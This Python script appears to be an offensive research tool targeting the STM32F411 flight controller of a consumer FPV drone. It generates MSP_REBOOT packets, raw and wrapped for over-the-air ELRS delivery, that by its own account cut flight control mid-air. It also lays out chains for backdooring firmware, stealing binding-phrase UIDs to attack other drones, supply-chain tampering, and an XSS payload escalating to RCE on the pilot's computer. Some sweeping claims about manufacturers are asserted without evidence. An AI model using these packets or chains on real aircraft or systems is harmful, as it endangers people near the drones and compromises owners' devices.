#!/usr/bin/env python3
"""
STM32F411 DFU Firmware Extraction & Persistence Chain

The EMAX TinyHawk III Plus uses an STM32F411CEU6 MCU which, based on
common manufacturer practices for consumer drones, is almost certainly
at RDP Level 0 (no readout protection). This means:

  1. Full firmware extraction via DFU mode (USB)
  2. Firmware modification and re-flash
  3. Persistent backdoor installation
  4. EEPROM/config extraction (binding phrase, PIDs, all settings)

RDP (Read-out Protection) Levels on STM32F411:
  - Level 0: No protection — JTAG/SWD/DFU read/write fully enabled
  - Level 1: Flash read disabled via debug, but DFU boot still works
             for erase + reflash (destructive, can be downgraded to L0)
  - Level 2: Permanent — debug permanently disabled, irreversible

Most consumer flight controllers ship at Level 0 because:
  - Users need to flash firmware updates via DFU (Betaflight Configurator)
  - Level 1 would brick the FC on any failed flash (can't read to verify)
  - Level 2 is permanent and would prevent all future updates

DFU entry methods:
  1. MSP_REBOOT with rebootMode=MSP_REBOOT_BOOTLOADER_ROM (mode 1)
     - Sends the FC into STM32 system bootloader (ROM DFU)
     - No physical access required — OTA via MSP-over-ELRS
     - msp.c:2283-2321: no ARMED check on MSP_REBOOT
  2. BOOT0 pin: Pull high during power-on (physical access)
  3. Betaflight Configurator: "Flash Firmware" enters DFU mode

Attack chains:
  A. Remote firmware extraction:
     1. Achieve ELRS connection (need UID + FHSS + CRC14)
     2. Send MSP_REBOOT(mode=1) — FC enters DFU bootloader
     3. USB must be physically connected (or SWD for JTAG path)
     → Requires physical proximity for USB, but DFU trigger is remote

  B. Evil maid firmware replacement:
     1. Brief physical access to USB port
     2. Enter DFU mode (BOOT0 or MSP command)
     3. Read full flash (512KB on STM32F411CE)
     4. Modify firmware (add backdoor, change behavior)
     5. Write modified firmware back
     6. FC boots with backdoor — persistent across power cycles

  C. EEPROM extraction for credential theft:
     1. Read flash including EEPROM emulation pages
     2. Extract: binding phrase UID, PID tuning, receiver config,
        VTX settings, all Betaflight configuration
     3. Use UID to attack other drones with the same binding phrase

  D. Supply chain attack:
     1. Intercept FC during shipping/purchase
     2. Extract + modify + reflash firmware
     3. Backdoor activates on specific condition (GPS coord, time, etc.)

Usage:
  python3 stm32-dfu-extract.py --analyze
  python3 stm32-dfu-extract.py --map-flash
  python3 stm32-dfu-extract.py --chain
  python3 stm32-dfu-extract.py --generate-msp-reboot

For authorized security research and CTF use only.
"""

import argparse
import json
import os
import struct
import sys

_TOOLS_DIR = os.path.dirname(os.path.abspath(__file__))
if _TOOLS_DIR not in sys.path:
    sys.path.insert(0, _TOOLS_DIR)


# ---------------------------------------------------------------------------
# STM32F411 constants
# ---------------------------------------------------------------------------

# STM32F411CEU6 specs
FLASH_SIZE_KB = 512
FLASH_SIZE = FLASH_SIZE_KB * 1024
FLASH_BASE = 0x08000000
SRAM_SIZE_KB = 128
SRAM_BASE = 0x20000000

# Flash sector layout (STM32F411)
FLASH_SECTORS = [
    {"sector": 0, "addr": 0x08000000, "size": 16*1024, "name": "Bootloader / vector table"},
    {"sector": 1, "addr": 0x08004000, "size": 16*1024, "name": "Betaflight code"},
    {"sector": 2, "addr": 0x08008000, "size": 16*1024, "name": "Betaflight code"},
    {"sector": 3, "addr": 0x0800C000, "size": 16*1024, "name": "Betaflight code"},
    {"sector": 4, "addr": 0x08010000, "size": 64*1024, "name": "Betaflight code (main)"},
    {"sector": 5, "addr": 0x08020000, "size": 128*1024, "name": "Betaflight code"},
    {"sector": 6, "addr": 0x08040000, "size": 128*1024, "name": "Betaflight code / EEPROM emulation"},
    {"sector": 7, "addr": 0x08060000, "size": 128*1024, "name": "EEPROM emulation / config storage"},
]

# RDP levels
RDP_LEVELS = {
    0: {
        "name": "Level 0 (No protection)",
        "byte": 0xAA,
        "description": "Full read/write access via JTAG/SWD/DFU. Flash readable.",
        "dfu_read": True,
        "dfu_write": True,
        "jtag_read": True,
        "likely_on_fc": True,
    },
    1: {
        "name": "Level 1 (Read protection)",
        "byte": "!= 0xAA and != 0xCC",
        "description": "Flash read disabled via debug. DFU write requires mass erase first.",
        "dfu_read": False,
        "dfu_write": True,  # but erases all flash first
        "jtag_read": False,
        "likely_on_fc": False,
    },
    2: {
        "name": "Level 2 (Permanent)",
        "byte": 0xCC,
        "description": "Debug permanently disabled. Irreversible. No DFU, no JTAG.",
        "dfu_read": False,
        "dfu_write": False,
        "jtag_read": False,
        "likely_on_fc": False,
    },
}

# MSP reboot modes
MSP_REBOOT_FIRMWARE = 0       # Normal reboot
MSP_REBOOT_BOOTLOADER_ROM = 1 # STM32 system bootloader (DFU)
MSP_REBOOT_MSC = 2            # Mass Storage Class mode
MSP_REBOOT_BOOTLOADER_FLASH = 3  # Custom bootloader in flash

# STM32 DFU USB identifiers
STM32_DFU_VID = 0x0483
STM32_DFU_PID = 0xDF11

# MSP constants
MSP_V1_HEADER = b"$M<"
MSP_CMD_REBOOT = 68  # 0x44


def msp_v1_checksum(cmd: int, payload: bytes) -> int:
    """MSP v1 checksum: XOR of length, command, and all payload bytes."""
    crc = len(payload) ^ cmd
    for b in payload:
        crc ^= b
    return crc & 0xFF


def build_msp_reboot(mode: int) -> dict:
    """Build MSP_REBOOT command packet for the given reboot mode."""
    payload = bytes([mode])
    crc = msp_v1_checksum(MSP_CMD_REBOOT, payload)
    frame = MSP_V1_HEADER + bytes([len(payload), MSP_CMD_REBOOT]) + payload + bytes([crc])

    mode_names = {
        0: "FIRMWARE (normal reboot)",
        1: "BOOTLOADER_ROM (STM32 DFU)",
        2: "MSC (mass storage)",
        3: "BOOTLOADER_FLASH (custom bootloader)",
    }

    return {
        "frame_hex": frame.hex(),
        "frame_bytes": list(frame),
        "command": MSP_CMD_REBOOT,
        "command_name": "MSP_REBOOT",
        "mode": mode,
        "mode_name": mode_names.get(mode, f"Unknown ({mode})"),
        "checksum": f"0x{crc:02x}",
        "armed_check": False,
        "effect": "FC enters STM32 system bootloader — USB DFU mode" if mode == 1 else mode_names.get(mode, "Unknown"),
    }


def crc8_dvbs2(data: bytes) -> int:
    """CRC-8/DVB-S2 for CRSF framing."""
    crc = 0
    for byte in data:
        crc ^= byte
        for _ in range(8):
            if crc & 0x80:
                crc = ((crc << 1) ^ 0xD5) & 0xFF
            else:
                crc = (crc << 1) & 0xFF
    return crc


def build_msp_over_crsf_reboot(mode: int) -> dict:
    """Build MSP_REBOOT wrapped in CRSF for OTA delivery."""
    # MSP payload
    msp_payload = bytes([mode])
    msp_crc = msp_v1_checksum(MSP_CMD_REBOOT, msp_payload)

    # CRSF MSP frame
    CRSF_ADDRESS_FC = 0xC8
    CRSF_ADDRESS_TX = 0xEA
    CRSF_FRAMETYPE_MSP_REQ = 0x7A
    flags = 0x30  # sequence=0, start+end flags
    payload_size = len(msp_payload)

    crsf_payload = bytes([
        CRSF_FRAMETYPE_MSP_REQ,
        CRSF_ADDRESS_TX,  # origin
        flags,
        payload_size,
        MSP_CMD_REBOOT,
    ]) + msp_payload + bytes([msp_crc])

    crsf_crc = crc8_dvbs2(crsf_payload)
    frame_len = len(crsf_payload) + 1  # +1 for CRC
    crsf_frame = bytes([CRSF_ADDRESS_FC, frame_len]) + crsf_payload + bytes([crsf_crc])

    return {
        "crsf_frame_hex": crsf_frame.hex(),
        "crsf_frame_bytes": list(crsf_frame),
        "msp_command": "MSP_REBOOT",
        "msp_mode": mode,
        "msp_mode_name": "BOOTLOADER_ROM (DFU)" if mode == 1 else f"mode {mode}",
        "crsf_crc": f"0x{crsf_crc:02x}",
        "msp_crc": f"0x{msp_crc:02x}",
        "note": "Fits in single ELRS OTA packet (5 MSP bytes)",
    }


def analyze_rdp():
    """Analyze RDP levels and their implications for firmware extraction."""
    print(f"\n{'='*65}")
    print("STM32F411 READ-OUT PROTECTION ANALYSIS")
    print(f"{'='*65}")

    for level, info in RDP_LEVELS.items():
        print(f"\n  RDP {info['name']}:")
        print(f"    Option byte: {info['byte']}")
        print(f"    {info['description']}")
        print(f"    DFU read:  {'YES' if info['dfu_read'] else 'NO'}")
        print(f"    DFU write: {'YES' if info['dfu_write'] else 'NO'}")
        print(f"    JTAG read: {'YES' if info['jtag_read'] else 'NO'}")
        print(f"    Likely on consumer FC: {'YES' if info['likely_on_fc'] else 'NO'}")

    print(f"\n  Why consumer FCs are almost always RDP Level 0:")
    print(f"    1. Betaflight Configurator needs DFU flash for firmware updates")
    print(f"    2. Level 1 requires mass erase before any flash — bricks on failure")
    print(f"    3. Level 2 is permanent and irreversible — no future updates ever")
    print(f"    4. EMAX ships preflashed BF 4.4.2 — no reason to lock it down")
    print(f"    5. No consumer FC manufacturer uses RDP in practice")


def map_flash():
    """Map the STM32F411 flash layout."""
    print(f"\n{'='*65}")
    print("STM32F411CE FLASH MEMORY MAP")
    print(f"{'='*65}")

    print(f"\n  Total flash: {FLASH_SIZE_KB} KB ({FLASH_SIZE:,} bytes)")
    print(f"  Base address: 0x{FLASH_BASE:08X}")
    print(f"  SRAM: {SRAM_SIZE_KB} KB at 0x{SRAM_BASE:08X}")

    print(f"\n  {'Sector':>7s}  {'Address':>12s}  {'Size':>8s}  {'Contents'}")
    print(f"  {'-'*7}  {'-'*12}  {'-'*8}  {'-'*40}")
    total = 0
    for s in FLASH_SECTORS:
        size_kb = s["size"] // 1024
        total += s["size"]
        print(f"  {s['sector']:>7d}  0x{s['addr']:08X}  {size_kb:>5d}KB  {s['name']}")
    print(f"  {'':>7s}  {'':>12s}  {total//1024:>5d}KB  Total")

    print(f"\n  EEPROM emulation (config storage):")
    print(f"    Betaflight uses flash sectors 6-7 for EEPROM emulation")
    print(f"    Contains: all CLI settings, PID tuning, receiver config,")
    print(f"    binding phrase UID, VTX table, OSD layout, failsafe config,")
    print(f"    motor/ESC settings, GPS config, board alignment, craft name")
    print()
    print(f"  Extractable secrets from EEPROM pages:")
    print(f"    - ELRS binding phrase UID (6 bytes) → crack binding phrase")
    print(f"    - Complete receiver configuration → understand pairing")
    print(f"    - VTX frequency/power settings → SmartAudio frequencies")
    print(f"    - Failsafe configuration → understand safety margins")
    print(f"    - PID tuning → understand flight characteristics")


def analyze_chain():
    """Analyze the full DFU firmware extraction/replacement chain."""
    print(f"\n{'='*65}")
    print("DFU ATTACK CHAINS")
    print(f"{'='*65}")

    chains = [
        {
            "name": "A: Remote DFU trigger + local USB extraction",
            "steps": [
                "Achieve ELRS OTA connection (need UID + FHSS + CRC14)",
                "Send MSP_REBOOT(mode=1) via MSP-over-ELRS",
                "FC enters STM32 system bootloader (DFU mode)",
                "Connect USB to FC (physical access for this step)",
                "Use dfu-util or STM32CubeProgrammer to read flash",
                "Full 512KB firmware dump in ~5 seconds",
            ],
            "requirements": "OTA access + brief physical USB access",
            "impact": "Full firmware + config extraction",
        },
        {
            "name": "B: Evil maid firmware backdoor",
            "steps": [
                "Brief physical access to powered-off drone",
                "Connect USB, hold BOOT0 (or use MSP if accessible)",
                "Read full 512KB flash via DFU",
                "Patch firmware: add MSP backdoor, modify failsafe, etc.",
                "Write modified firmware back to flash",
                "Drone boots normally with persistent backdoor",
            ],
            "requirements": "Physical access (minutes), DFU tools",
            "impact": "Persistent compromise surviving power cycles",
        },
        {
            "name": "C: Credential extraction from EEPROM",
            "steps": [
                "Extract firmware via Chain A or B",
                "Parse EEPROM emulation pages (sectors 6-7)",
                "Extract ELRS UID (binding phrase derivative)",
                "If UID matches known phrase → binding phrase recovered",
                "Use UID to attack other drones with same phrase",
                "Extract all config: PIDs, failsafe, VTX, GPS",
            ],
            "requirements": "Flash dump",
            "impact": "Binding phrase theft → attack all drones in fleet",
        },
        {
            "name": "D: DFU-to-Configurator supply chain",
            "steps": [
                "Modify firmware to include crafted MSP response handler",
                "When Configurator connects, FC sends XSS payload via MSP",
                "MSP_SET_NAME stores '<img/src=x onerror=...>'",
                "Configurator renders craft name without sanitization",
                "XSS executes in Electron context",
                "CVE-2026-70601: context-isolation bypass → host RCE",
            ],
            "requirements": "Modified firmware + victim uses Configurator",
            "impact": "FC compromise → host computer compromise",
        },
    ]

    for chain in chains:
        print(f"\n  Chain {chain['name']}:")
        for i, step in enumerate(chain["steps"], 1):
            print(f"    {i}. {step}")
        print(f"    Requirements: {chain['requirements']}")
        print(f"    Impact: {chain['impact']}")


def main():
    parser = argparse.ArgumentParser(
        description="STM32F411 DFU Firmware Extraction & Persistence Chain"
    )
    parser.add_argument(
        "--analyze", action="store_true",
        help="Analyze RDP levels and extraction feasibility",
    )
    parser.add_argument(
        "--map-flash", action="store_true",
        help="Map STM32F411 flash sectors and contents",
    )
    parser.add_argument(
        "--chain", action="store_true",
        help="Analyze full DFU attack chains",
    )
    parser.add_argument(
        "--generate-msp-reboot", action="store_true",
        help="Generate MSP_REBOOT commands for DFU entry",
    )
    parser.add_argument(
        "-o", "--output",
        help="Output JSON file",
    )
    parser.add_argument(
        "-v", "--verbose", action="store_true",
    )
    args = parser.parse_args()

    print("STM32F411 DFU Firmware Extraction Chain")
    print(f"Target MCU: STM32F411CEU6 (EMAX TinyHawk III Plus)")
    print(f"Flash: {FLASH_SIZE_KB}KB at 0x{FLASH_BASE:08X}")
    print(f"Expected RDP: Level 0 (no protection)")
    print(f"DFU USB ID: {STM32_DFU_VID:04X}:{STM32_DFU_PID:04X}")

    results = {
        "mcu": "STM32F411CEU6",
        "flash_size_kb": FLASH_SIZE_KB,
        "flash_base": f"0x{FLASH_BASE:08X}",
        "expected_rdp": 0,
        "dfu_usb_vid": f"0x{STM32_DFU_VID:04X}",
        "dfu_usb_pid": f"0x{STM32_DFU_PID:04X}",
    }

    if args.analyze:
        analyze_rdp()
        results["mode"] = "analyze"

    if args.map_flash:
        map_flash()
        results["flash_sectors"] = FLASH_SECTORS
        results["mode"] = "map-flash"

    if args.chain:
        analyze_chain()
        results["mode"] = "chain"

    if args.generate_msp_reboot:
        print(f"\n{'='*65}")
        print("MSP_REBOOT COMMANDS FOR DFU ENTRY")
        print(f"{'='*65}")

        for mode in [MSP_REBOOT_FIRMWARE, MSP_REBOOT_BOOTLOADER_ROM,
                     MSP_REBOOT_MSC, MSP_REBOOT_BOOTLOADER_FLASH]:
            msp_pkt = build_msp_reboot(mode)
            print(f"\n  Mode {mode}: {msp_pkt['mode_name']}")
            print(f"    MSP frame: {msp_pkt['frame_hex']}")
            print(f"    ARMED check: {'YES' if msp_pkt['armed_check'] else 'NO'}")
            print(f"    Effect: {msp_pkt['effect']}")

        print(f"\n  MSP-over-CRSF (for OTA delivery via ELRS):")
        crsf_pkt = build_msp_over_crsf_reboot(MSP_REBOOT_BOOTLOADER_ROM)
        print(f"    CRSF frame: {crsf_pkt['crsf_frame_hex']}")
        print(f"    {crsf_pkt['note']}")
        print(f"    Effect: Remote DFU entry — FC enters STM32 bootloader")

        results["msp_reboot_packets"] = {
            "dfu_mode": build_msp_reboot(MSP_REBOOT_BOOTLOADER_ROM),
            "crsf_wrapped": crsf_pkt,
        }
        results["mode"] = "generate-msp-reboot"

    if not any([args.analyze, args.map_flash, args.chain, args.generate_msp_reboot]):
        analyze_rdp()
        map_flash()
        analyze_chain()

    # Assessment
    print(f"\n{'='*65}")
    print("ASSESSMENT")
    print(f"{'='*65}")
    print("  STM32F411 at RDP Level 0 is a complete loss of firmware")
    print("  confidentiality and integrity. The entire 512KB flash —")
    print("  including all Betaflight configuration, binding phrase UID,")
    print("  PID tuning, and failsafe settings — is extractable via USB.")
    print()
    print("  The DFU entry trigger (MSP_REBOOT mode=1) has no ARMED check,")
    print("  meaning it can be sent OTA via MSP-over-ELRS while flying.")
    print("  This causes immediate loss of flight control as the FC reboots")
    print("  into the bootloader — equivalent to a hard kill.")
    print()
    print("  For persistence: a modified firmware flashed back to the FC")
    print("  survives power cycles and factory resets (which only clear")
    print("  EEPROM pages, not the firmware code sectors). The only fix")
    print("  is a known-good firmware reflash — which most users wouldn't")
    print("  think to do after a 'glitch' or 'weird behavior'.")
    print()
    print("  The DFU-to-Configurator chain (Chain D) extends the attack")
    print("  from the drone to the pilot's computer via XSS in the craft")
    print("  name field rendered by Betaflight Configurator's Electron app.")

    if args.output:
        with open(args.output, "w") as f:
            json.dump(results, f, indent=2)
        print(f"\nResults written to {args.output}")

    return 0


if __name__ == "__main__":
    sys.exit(main())
